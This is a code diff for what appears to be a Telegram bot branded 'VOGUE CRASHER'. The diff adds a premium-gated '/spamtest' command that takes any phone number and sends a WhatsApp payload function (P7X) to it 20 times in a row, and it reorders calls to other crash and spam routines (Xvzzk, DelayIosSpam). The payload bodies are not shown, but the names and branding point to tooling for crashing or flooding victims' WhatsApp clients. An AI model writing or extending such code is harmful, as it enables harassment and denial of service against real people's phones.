@@ -2194,9 +2194,85 @@ Status      : Success
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await Xvzzk(sock, target);
                     await DelayIosSpam(sock, target);
-                    await P7X(sock, target);
+                    await Xvzzk(sock, target);
+                    await sleep(1000)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    autoRestartOn408(e);
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+    }
+});
+
+bot.command('spamtest', checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+
+──────────────────────────
+</pre>`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 20; i++) {
+                try {
+                    if (!sock) {
+                        throw new Error("Socket unavailable");
+                    }
+                    await P7X(sock, target)
                     await sleep(1000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
